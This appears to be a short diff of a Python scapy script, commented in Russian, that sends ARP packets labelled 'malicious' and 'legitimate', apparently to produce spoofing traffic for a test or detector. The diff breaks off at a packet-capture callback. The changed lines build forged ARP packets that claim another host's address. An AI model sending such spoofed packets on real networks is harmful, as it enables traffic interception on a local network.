@@ -1,12 +1,13 @@
 from scapy.all import ARP, send, sniff, Ether
 
-# Отправка поддельного ARP ответа (атакующий)
-fake_arp_response = ARP(op=2, psrc='10.0.0.1', pdst='10.0.0.50', hwdst='ff:ff:ff:ff:ff:ff')
-send(fake_arp_response)
+# Вредоносный ARP-запрос, пытающийся подменить MAC-адрес 10.0.0.1
+malicious_arp_request = ARP(op=1, pdst="10.0.0.1", psrc="10.0.0.50", hwsrc="4a:1c:a8:0c:07:20")
+send(malicious_arp_request)
 
-# Отправка правильного ARP запроса (легитимный)
-legit_arp_request = ARP(op=1, pdst='10.0.0.1', hwdst='ff:ff:ff:ff:ff:ff')
-send(legit_arp_request)
+# Легитимный ARP-запрос от хоста 10.0.0.50 к хосту 10.0.0.1
+legitimate_arp_request = ARP(op=1, pdst="10.0.0.1", psrc="10.0.0.50", hwsrc="5a:1c:a8:0c:07:21")
+send(legitimate_arp_request)
+
 
 # Функция для обработки захваченных пакетов
 def arp_packet_callback(packet):
